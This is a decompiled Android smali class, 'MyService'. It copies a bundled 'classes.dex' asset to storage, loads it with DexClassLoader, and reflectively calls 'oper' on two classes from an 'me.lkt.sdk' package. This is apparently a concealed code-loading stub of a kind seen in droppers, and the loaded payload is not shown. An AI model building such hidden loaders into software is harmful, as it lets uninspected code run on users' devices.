.class public Laaa/bbb/MyService;
.super Landroid/app/IntentService;
.source "MyService.java"


# instance fields
.field private dcl:Ldalvik/system/DexClassLoader;

.field private dexFile:Ljava/lang/String;

.field private odexDir:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 14
    const-string v0, "MyService"

    invoke-direct {p0, v0}, Laaa/bbb/MyService;-><init>(Ljava/lang/String;)V

    .line 15
    return-void
.end method

.method public constructor <init>(Ljava/lang/String;)V
    .locals 0
    .param p1, "name"    # Ljava/lang/String;

    .prologue
    .line 18
    invoke-direct {p0, p1}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    .line 19
    return-void
.end method

.method private call(Ldalvik/system/DexClassLoader;Ljava/lang/String;)V
    .locals 7
    .param p1, "dcl"    # Ldalvik/system/DexClassLoader;
    .param p2, "pkg"    # Ljava/lang/String;

    .prologue
    .line 56
    :try_start_0
    invoke-virtual {p1, p2}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 57
    .local v0, "cls":Ljava/lang/Class;
    const-string v3, "oper"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    const-class v6, Landroid/content/Context;

    aput-object v6, v4, v5

    invoke-virtual {v0, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 58
    .local v2, "m":Ljava/lang/reflect/Method;
    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 59
    const/4 v3, 0x0

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    aput-object p0, v4, v5

    invoke-virtual {v2, v3, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 63
    .end local v0    # "cls":Ljava/lang/Class;
    .end local v2    # "m":Ljava/lang/reflect/Method;
    :goto_0
    return-void

    .line 60
    :catch_0
    move-exception v1

    .line 61
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onCreate()V
    .locals 2

    .prologue
    .line 26
    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    .line 27
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Laaa/bbb/MyService;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "classes.dex"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Laaa/bbb/MyService;->dexFile:Ljava/lang/String;

    .line 28
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Laaa/bbb/MyService;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "/odex"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Laaa/bbb/MyService;->odexDir:Ljava/lang/String;

    .line 29
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Laaa/bbb/MyService;->odexDir:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    .line 30
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 6
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 38
    :try_start_0
    invoke-virtual {p0}, Laaa/bbb/MyService;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v1

    const-string v2, "classes.dex"

    invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v1

    iget-object v2, p0, Laaa/bbb/MyService;->dexFile:Ljava/lang/String;

    invoke-static {v1, v2}, Laaa/bbb/FileUtil;->copy(Ljava/io/InputStream;Ljava/lang/String;)V

    .line 39
    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Laaa/bbb/MyService;->dexFile:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 40
    new-instance v1, Ldalvik/system/DexClassLoader;

    iget-object v2, p0, Laaa/bbb/MyService;->dexFile:Ljava/lang/String;

    iget-object v3, p0, Laaa/bbb/MyService;->odexDir:Ljava/lang/String;

    const/4 v4, 0x0

    .line 41
    invoke-virtual {p0}, Laaa/bbb/MyService;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v5

    invoke-direct {v1, v2, v3, v4, v5}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 40
    iput-object v1, p0, Laaa/bbb/MyService;->dcl:Ldalvik/system/DexClassLoader;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 46
    :cond_0
    :goto_0
    iget-object v1, p0, Laaa/bbb/MyService;->dcl:Ldalvik/system/DexClassLoader;

    if-eqz v1, :cond_1

    .line 48
    iget-object v1, p0, Laaa/bbb/MyService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v2, "me.lkt.sdk.dd.DDOper"

    invoke-direct {p0, v1, v2}, Laaa/bbb/MyService;->call(Ldalvik/system/DexClassLoader;Ljava/lang/String;)V

    .line 50
    iget-object v1, p0, Laaa/bbb/MyService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v2, "me.lkt.sdk.jz.buss.JzOper"

    invoke-direct {p0, v1, v2}, Laaa/bbb/MyService;->call(Ldalvik/system/DexClassLoader;Ljava/lang/String;)V

    .line 52
    :cond_1
    return-void

    .line 43
    :catch_0
    move-exception v0

    .line 44
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method
